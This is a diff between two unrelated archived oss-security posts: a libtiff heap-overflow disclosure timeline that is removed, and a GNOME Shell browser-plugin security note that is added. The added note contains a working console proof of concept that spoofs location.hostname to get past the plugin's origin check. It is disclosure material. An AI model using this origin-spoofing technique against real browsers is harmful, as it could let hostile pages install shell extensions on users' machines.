@@ -1,103 +1,97 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2012/04/07/2
-Message-ID: <20120407115845.GA32103@openwall.com>
-Date: Sat, 7 Apr 2012 15:58:45 +0400
-From: Solar Designer <solar@...nwall.com>
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2012/09/08/1
+Message-ID: <mpro.ma1ysf01zd0kg050u.taviso@cmpxchg8b.com>
+Date: Sun, 9 Sep 2012 00:36:26 +0200
+From: Tavis Ormandy <taviso@...xchg8b.com>
 To: oss-security@...ts.openwall.com
-Cc: Frank Warmerdam <warmerdam@...ox.com>, zdi@...pingpoint.com, M Hjkoko <m-hjkoko@...mail.com>
-Subject: libtiff tif_getimage.c integer overflow leading to heap overwrite when parsing certain TIFF files (ZDI-CAN-1221 / CVE-2012-1173)
+Subject: note on gnome shell extensions
 Content-Type: text/plain; charset=utf-8
 
-Hi,
+List, I just installed Fedora 17 on a workstation. While researching how to
+upgrade gnome 3 to version 2, I noticed it installed a browser extension
+called "Gnome Shell Integration".
 
-I realize that it is not great to post this on a weekend.  The issue was
-technically made public on April 4 (Wednesday), however unfortunately
-the folks on distros list who were actually involved in its handling
-have failed to post about it to oss-security in time - so I feel I had
-to substitute for them.  Delaying this further till Monday felt even
-worse since the issue was already public.
+$ rpm -qf /usr/lib64/mozilla/plugins/libgnome-shell-browser-plugin.so
+gnome-shell-3.4.1-5.fc17.x86_64
 
-This issue was tracked as ZDI-CAN-1221 / CVE-2012-1173.
+The NPPVpluginDescriptionString states "It can be used only by
+extensions.gnome.org", but I happen to know that is a tricky thing to get
+right.
 
-Vincent Danen summarized the issue as follows (in a comment on Red Hat
-bug 803078):
+102   if (!funcs.getproperty (instance, NPVARIANT_TO_OBJECT (document),
+103                           funcs.getstringidentifier ("location"),
+104                           &location))
+105     goto out;
+106 
+107   if (!NPVARIANT_IS_OBJECT (location))
+108     goto out;
+109 
+110   hostname = get_string_property (instance,
+111                                   NPVARIANT_TO_OBJECT (location),
+112                                   "hostname");
+113 
+114   if (g_strcmp0 (hostname, ORIGIN))
+115     {
+116       g_debug ("origin does not match, is %s",
+117                hostname);
+118 
+119       goto out;
+120     }
 
-"A flaw was found in the way that LibTIFF attempted to allocate space for a tile
-within a TIFF image file.  When calculating the size for a buffer, LibTIFF
-performs a multiply that can cause an integer overflow.  After allocation,
-LibTIFF will initialize the buffer with the tile data, which can cause code
-execution under the context of the application using LibTIFF, and with the
-calling user's permissions."
+I'm familiar with this topic as I wrote a tool for managing broken but
+necessary plugins by restricting them to trusted domains.
 
-Upstream Bugzilla entry, which now has patches attached to it (thank
-you, Frank):
+http://code.google.com/p/nssecurity
 
-http://bugzilla.maptools.org/show_bug.cgi?id=2369
+As far as I know, browsers only attempt to prevent tampering with
+document.location.href, anything else can be modified. For example, this
+works in Chrome, I don't know the syntax for Mozilla:
 
-Looking at the patches, I actually see two instances of integer
-multiplication before heap buffer allocation patched to use
-TIFFSafeMultiply(): one of them is for tilesize, the other for
-stripsize.  I assume CVE-2012-1173 applies to both issues at once.
+> location.__defineGetter__("hostname", function () { return "arbitrary"; })
+  undefined
+> location.hostname
+  "arbitrary"
 
-So far, I am only aware of Mandrake having announced this via
-MDVSA-2012:054 published on April 5.  Some other distros appear to have
-patched the issue or/and have made changelog/bug entries relating to it
-public without issuing an advisory yet.
+However,  
 
-On April 6, the Red Hat bug entry:
+> location.__defineGetter__("href", function () { return "arbitrary"; })
+  undefined
+> location.href
+  "http://realurl.test/asdasd"
 
-https://bugzilla.redhat.com/show_bug.cgi?id=803078
+So this should fail:
 
-got an extra comment posted to it by Karel Volny with what appears to be
-an extra bug to patch (non-security?)  It also references not-public-yet
-RH bug 810551 (I have no idea what that one is - I did say I was not the
-best person to post this).
+> o = document.createElement('OBJECT')
+  <object>?</object>?
+> o.setAttribute('TYPE', 'application/x-gnome-shell-integration')
+  undefined
+> document.body.appendChild(o)
+  <object type=?"application/?x-gnome-shell-integration">?</object>?
+> o.shellVersion
+  undefined
 
-The timeline appears to be as follows:
+But we can re-insert it and make it work:
 
-2011-05-12 or earlier: bug discovered and reported to ZDI by Alexander Gavrun
+> document.body.removeChild(o)
+  <object type=?"application/?x-gnome-shell-integration">?</object>?
+> location.__defineGetter__("hostname", function () { return
+"extensions.gnome.org"; })
+  undefined
+> document.body.appendChild(o)
+  <object type=?"application/?x-gnome-shell-integration">?</object>?
+> o.shellVersion
+  "3.4.1"
+> document.location.href
+  "https://www.redhat.com/"
 
-2011-05-12: bug reported by ZDI to libtiff upstream (Frank Warmerdam)
+The plugin incorrectly trusted hostname, and initialized. As far as I can
+tell, the plugin will let you install new shell extensions, I don't know
+what the impact of that is, can they contain native code?
 
-2012-03-09: M Hjkoko creates the bug entry
-http://bugzilla.maptools.org/show_bug.cgi?id=2369 and thereby reminds
-upstream of the issue
+Tavis.
 
-2012-03-12: M Hjkoko alerts the distros list that there's an upcoming
-libtiff issue listed at
-http://www.zerodayinitiative.com/advisories/upcoming/
-No detail is included, and all info posted to the distros list by this
-point is publicly available, hence the distros list embargo timer is not
-ticking yet.  (Maybe we should have posted the same info to oss-security
-at that time, though.)
+-- 
+-------------------------------------
+taviso@...xchg8b.com | pgp encrypted mail preferred
+-------------------------------------------------------
 
-2012-03-13: CVE-2012-1173 is assigned by Red Hat.
-
-2012-03-21: Red Hat folks post to distros list (in response to inquiry
-by a non-Red Hat list member) actual detail on the issue, which they had
-obtained from ZDI in the previous few days.  Since non-public info got
-to the distros list at this point, the embargo timer started ticking.
-Unfortunately, this aspect was not understood and thus was not
-coordinated with ZDI and upstream prior to the distros list posting.
-
-2012-03-xx: apparently, Tom Lane at Red Hat works on the fixes.
-(Current upstream patches credit Tom for the fixes.)
-
-2012-03-27 - 2012-03-30: Discussion regarding embargo time and how we
-must make the issue public no later than 2012-04-04 (14 days since
-2012-03-21).  Luckily, ZDI was OK with this, and Frank even proposed
-making the issue public on 2012-04-01 (thanks!), but then 2012-04-04 was
-quickly agreed upon as the coordinated release date.
-
-2012-04-04: The issue is supposed to be made public.
-
-2012-04-05: MDVSA-2012:054 is published.
-
-2012-04-06: Upstream patches are posted at
-http://bugzilla.maptools.org/show_bug.cgi?id=2369#c4
-
-2012-04-06: Karel Volny's comment is posted at
-https://bugzilla.redhat.com/show_bug.cgi?id=803078#c22
-(might require further work)
-
-Alexander
